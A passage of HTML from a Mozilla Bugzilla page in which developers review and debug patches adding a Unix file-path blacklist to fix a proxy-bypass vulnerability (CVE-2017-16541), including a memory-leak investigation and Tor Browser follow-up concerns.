                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-86" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c86">Comment 86</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 15:08 PDT" data-time="1529532494">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-86">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-86" data-comment-id="13416180"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=ac637b5788987c614efb97cbc6e08c065172b831">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=ac637b5788987c614efb97cbc6e08c065172b831</a></pre></div><div class="change-set" id="c87"><div class="comment" data-id="13416187" data-no="87"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-87" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20410016_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20410016_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-87"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-87" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c87">Comment 87</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 15:11 PDT" data-time="1529532679">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-87">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8986596"
         class="attachment patch obsolete"
         data-id="8986596" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist-esr60.patch">
      <meta itemprop="contentSize" content="30412">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8986596">
          <a class="link" href="attachment.cgi?id=8986596&amp;action=diff">
        <span id="att-8986596-description" itemprop="description">[ESR60]  patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8986596&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986596">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-87" data-comment-id="13416187">The build selftest failed because the pref needed to be added to the early list</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8986596&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8986596</a> -
        Flags: review?(bkelly)</div></div></div><div class="change-set" id="a20486747_415378"><div class="change" id="aa20486747_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a20486747_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a20486747_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a20486747_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a20486747_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-20 15:11 PDT" data-time="1529532681">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8986493&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8986493</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c88"><div class="comment" data-id="13417416" data-no="88"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-88" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_465500" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/bc5e85dbd8d5c9b11c419c65ee4081b5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_465500" id="a20486747_415378"><a class="email " href="/user_profile?user_id=465500" > <span class="fna">Ben Kelly [:bkelly, not reviewing]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-88"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-88" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c88">Comment 88</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-21 06:41 PDT" data-time="1529588517">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-88">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-88" data-comment-id="13417416">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8986596" name="attach_8986596" title="[ESR60]  patch">attachment 8986596</a> <a href="/attachment.cgi?id=8986596&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8986596&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986596'>[review]</a>
[ESR60]  patch

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8986596" name="attach_8986596" title="[ESR60]  patch">attachment 8986596</a> <a href="/attachment.cgi?id=8986596&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8986596&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986596'>[review]</a>:
-----------------------------------------------------------------

I only reviewed the ContentPrefs.cpp file.  It looked like the rest of the patch had already been reviewed elsewhere in this bug.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8986596&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8986596</a> -
        Flags: review?(bkelly) &rarr; review+</div></div></div><div class="change-set" id="c89"><div class="comment" data-id="13417608" data-no="89"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-89" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a20486747_415378"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-89"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-89" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c89">Comment 89</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-21 07:41 PDT" data-time="1529592078">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-89">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-89" data-comment-id="13417608">(In reply to Valentin Gosu [:valentin] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c87">comment #87</a>)
<span class="quote">&gt; Created <span class="bz_obsolete"><a href="/attachment.cgi?id=8986596" name="attach_8986596" title="[ESR60]  patch">attachment 8986596</a> <a href="/attachment.cgi?id=8986596&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8986596&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986596'>[review]</a>
&gt; [ESR60]  patch
&gt; 
&gt; The build selftest failed because the pref needed to be added to the early
&gt; list</span >

That one works for us, thanks so much! (The one you pointed me to in comment:83 still shows the problem. It took me a while to figure out what was going on :) )

I am not sure about the symlink issue yet. While I am not worried about the attacker being able to create a symlink I feel it should not be possible for arbitrary (third-party) web content to trigger any proxy bypass in case the user has told the browser &quot;hey, for any web-related traffic, please use proxy $foo&quot;, irrespective of how the machine of the user outside of the browser is configured. This does not block our alpha release, but we should think about it while we progress towards getting Tor Browser 8 into stable shape.</pre></div><div class="change-set" id="c90"><div class="comment" data-id="13418419" data-no="90"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-90" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20486747_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-90"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-90" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c90">Comment 90</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-21 12:46 PDT" data-time="1529610373">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-90">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-90" data-comment-id="13418419">Nathan, can you take a look at <span class=""><a href="/attachment.cgi?id=8986337" name="attach_8986337" title="patch">attachment 8986337</a> <a href="/attachment.cgi?id=8986337&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8986337&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986337'>[review]</a> ?
I'm leaking an nsTArray_base, sBlacklist, and I'm not exactly sure I'm using StaticAutoPtr correctly.
I've confirmed it's not sWhitelist by commenting it out: <a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=064c72d8511a3fa831cef3282fb75930ad6acf93&amp;selectedJob=184200087">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=064c72d8511a3fa831cef3282fb75930ad6acf93&amp;selectedJob=184200087</a>

Any idea why this leak is happening? Thanks!</pre></div><div class="change-set" id="c91"><div class="comment" data-id="13418563" data-no="91"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-91" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_417288" id="a20486747_415378"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_417288" id="a20486747_415378"><a class="email " href="/user_profile?user_id=417288" > <span class="fna">Nathan Froyd [:froydnj]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-91"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-91" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c91">Comment 91</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-21 13:42 PDT" data-time="1529613779">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-91">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-91" data-comment-id="13418563">Talking to Valentin over IRC turned up two potential scenarios for sBlacklist to leak:

a) InitPrefs possibly getting called after sBlacklist has been released:

<a rel="nofollow" href="https://hg.mozilla.org/try/rev/7fb190786695#l1.49">https://hg.mozilla.org/try/rev/7fb190786695#l1.49</a>

So we're re-initializing prefs after shutdown...which seems quite unlikely.

b) Some sort of race in IsAllowedPath:

<a rel="nofollow" href="https://hg.mozilla.org/try/rev/145bf576adf9#l1.358">https://hg.mozilla.org/try/rev/145bf576adf9#l1.358</a>

T1: In IsAllowedPath, check for the presence of sBlacklist
T1: sBlacklist is there, proceed
T2: clear sBlacklist as we're going through shutdown
T1: Call PathBlacklist, which re-allocates sBlacklist and leaks

This race is plausible in <span class=""><a href="/attachment.cgi?id=8986337" name="attach_8986337" title="patch">attachment 8986337</a> <a href="/attachment.cgi?id=8986337&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8986337&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986337'>[review]</a> (though we really should have some checking in the ClearOnShutdown machinery to catch this sort of thing), but the try push actually changes things in IsAllowedPath:

<a rel="nofollow" href="https://hg.mozilla.org/try/file/5c706ce50459/xpcom/io/FilePreferences.cpp#l267">https://hg.mozilla.org/try/file/5c706ce50459/xpcom/io/FilePreferences.cpp#l267</a>

so that we don't try reallocating...but in that case, we should hit some sort of null pointer dereference if the race was really happening.

I tried getting a handle on where the allocated nsTArray_base was coming from, but the debugging infrastructure we had for that blew up in my face.

So now I'm not sure where the leak is coming from. =/</pre></div><div class="change-set" id="c92"><div class="comment" data-id="13451123" data-no="92"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-92" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20486747_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-92"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-92" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c92">Comment 92</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-05 10:32 PDT" data-time="1530811948">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-92">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8990057"
         class="attachment patch"
         data-id="8990057" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="base-fa1f62fabd3e">
      <meta itemprop="contentSize" content="1303">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8990057">
          <a class="link" href="attachment.cgi?id=8990057&amp;action=diff">
        <span id="att-8990057-description" itemprop="description">Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms</span></a>
        — <a href="attachment.cgi?id=8990057&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-92" data-comment-id="13451123">This call gated by ifdef OS_WIN - so on Linux it would leak objects that were supposed to be ClearOnShutdown in the plugin process</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990057&amp;action=edit"
           title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms"
           class=""
        >Attachment #8990057</a> -
        Flags: review?(jmathies)</div></div></div><div class="change-set" id="c93"><div class="comment" data-id="13451129" data-no="93"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-93" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20486747_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-93"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-93" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c93">Comment 93</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-05 10:35 PDT" data-time="1530812151">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-93">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8990058"
         class="attachment patch obsolete"
         data-id="8990058" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="base-1356f36a3d11">
      <meta itemprop="contentSize" content="28272">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8990058">
          <a class="link" href="attachment.cgi?id=8990058&amp;action=diff">
        <span id="att-8990058-description" itemprop="description">Add ability to blacklist file paths on Unix platforms</span></a> (obsolete)
        — <a href="attachment.cgi?id=8990058&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990058">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990058&amp;action=edit"
           title="Add ability to blacklist file paths on Unix platforms"
           class=""
        >Attachment #8990058</a> -
        Flags: review?(honzab.moz)</div></div></div><div class="change-set" id="c94"><div class="comment" data-id="13453351" data-no="94"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-94" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a20486747_415378"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a20486747_415378"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-94"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-94" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c94">Comment 94</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-06 08:41 PDT" data-time="1530891674">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-94">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-94" data-comment-id="13453351">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8990058" name="attach_8990058" title="Add ability to blacklist file paths on Unix platforms">attachment 8990058</a> <a href="/attachment.cgi?id=8990058&amp;action=edit" title="Add ability to blacklist file paths on Unix platforms">[details]</a> <a href="/attachment.cgi?id=8990058&amp;action=diff" title="Add ability to blacklist file paths on Unix platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8990058'>[review]</a>
Add ability to blacklist file paths on Unix platforms

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8990058" name="attach_8990058" title="Add ability to blacklist file paths on Unix platforms">attachment 8990058</a> <a href="/attachment.cgi?id=8990058&amp;action=edit" title="Add ability to blacklist file paths on Unix platforms">[details]</a> <a href="/attachment.cgi?id=8990058&amp;action=diff" title="Add ability to blacklist file paths on Unix platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8990058'>[review]</a>:
-----------------------------------------------------------------

::: xpcom/io/FilePreferences.cpp
&#64;&#64; +10,2 &#64;&#64;
<span class="quote">&gt;  #include &quot;mozilla/Preferences.h&quot;
&gt; +#include &quot;mozilla/StaticPtr.h&quot;</span >

when you are here, can you please incorporate [1] here?  just the #include.  thanks.  or, maybe it belongs to the header?

[1] <a rel="nofollow" href="https://bugzilla.mozilla.org/attachment.cgi?id=8986398&amp;action=diff#a/xpcom/io/FilePreferences.cpp_sec2">https://bugzilla.mozilla.org/attachment.cgi?id=8986398&amp;action=diff#a/xpcom/io/FilePreferences.cpp_sec2</a>

&#64;&#64; +120,5 &#64;&#64;
<span class="quote">&gt;    }
&gt;  
&gt; +  bool Get(nsTSubstring&lt;TChar&gt;&amp; aNormalizedFilePath)
&gt; +  {
&gt; +    aNormalizedFilePath.Truncate();</span >

there probably wasn't a need to inline this, but as this is static, it doesn't matter

&#64;&#64; +269,5 &#64;&#64;
<span class="quote">&gt; +    return true;
&gt; +  }
&gt; +
&gt; +  nsTAutoString&lt;char_path_t&gt; normalized;
&gt; +  if (!Normalizer&lt;char_path_t&gt;(aFilePath, Normalizer&lt;char_path_t&gt;::Token::Char(kPathSeparator)).Get(normalized)) {</span >

don't you want TNormalizer&lt;T&gt; and then then `typedef TNormalizer&lt;char_path_t&gt; Normalizer;` ?

::: xpcom/io/nsLocalFileUnix.cpp
&#64;&#64; +1048,4 &#64;&#64;
<span class="quote">&gt;  
&gt;    // check to make sure that we have a new parent
&gt;    nsAutoCString newPathName;
&gt;    rv = GetNativeTargetPathName(aNewParent, aNewName, newPathName);</span >

we may want to check before this call

&#64;&#64; +2199,4 &#64;&#64;
<span class="quote">&gt;  
&gt;    // check to make sure that we have a new parent
&gt;    nsAutoCString newPathName;
&gt;    rv = GetNativeTargetPathName(aNewParentDir, aNewName, newPathName);</span >

as well here?</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990058&amp;action=edit"
           title="Add ability to blacklist file paths on Unix platforms"
           class=""
        >Attachment #8990058</a> -
        Flags: review?(honzab.moz) &rarr; review+</div></div></div><div class="change-set" id="c95"><div class="comment" data-id="13457168" data-no="95"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-95" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20486747_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20486747_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-95"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-95" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c95">Comment 95</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-09 01:10 PDT" data-time="1531123840">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-95">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-95" data-comment-id="13457168">(In reply to Honza Bambas (:mayhemer) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c94">comment #94</a>)
<span class="quote">&gt; don't you want TNormalizer&lt;T&gt; and then then `typedef
&gt; TNormalizer&lt;char_path_t&gt; Normalizer;` ?</span >

Great suggestion, Thanks!

<span class="quote">&gt; ::: xpcom/io/nsLocalFileUnix.cpp
&gt; &gt;    rv = GetNativeTargetPathName(aNewParent, aNewName, newPathName);
&gt; 
&gt; we may want to check before this call
&gt; &gt;    rv = GetNativeTargetPathName(aNewParentDir, aNewName, newPathName);
&gt; 
&gt; as well here?</span >

Before these calls we have CHECK_mPath which checks FilePreferences::IsAllowedPath()</pre></div><div class="change-set" id="a22377217_279663"><div class="change" id="aa22377217_279663">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a22377217_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a22377217_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a22377217_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a22377217_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a22377217_279663">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-12 12:19 PDT" data-time="1531423151">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990057&amp;action=edit"
           title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms"
           class=""
        >Attachment #8990057</a> -
        Flags: review?(jmathies) &rarr; review+</div></div></div><div class="change-set" id="c96"><div class="comment" data-id="13474191" data-no="96"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-96" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a22377217_279663"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a22377217_279663"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-96"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-96" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c96">Comment 96</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-16 08:28 PDT" data-time="1531754901">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-96">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-96" data-comment-id="13474191"><a rel="nofollow" href="https://hg.mozilla.org/integration/mozilla-inbound/rev/9ec0f327c5efc38970c090015eaf11a7e5c450b7">https://hg.mozilla.org/integration/mozilla-inbound/rev/9ec0f327c5efc38970c090015eaf11a7e5c450b7</a>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081">Bug 1412081</a> - Add ability to blacklist file paths on Unix platforms r=mayhemer

<a rel="nofollow" href="https://hg.mozilla.org/integration/mozilla-inbound/rev/26163df1083ea2847022e60518ab973360b9d7c1">https://hg.mozilla.org/integration/mozilla-inbound/rev/26163df1083ea2847022e60518ab973360b9d7c1</a>
<a class="bz_bug_link
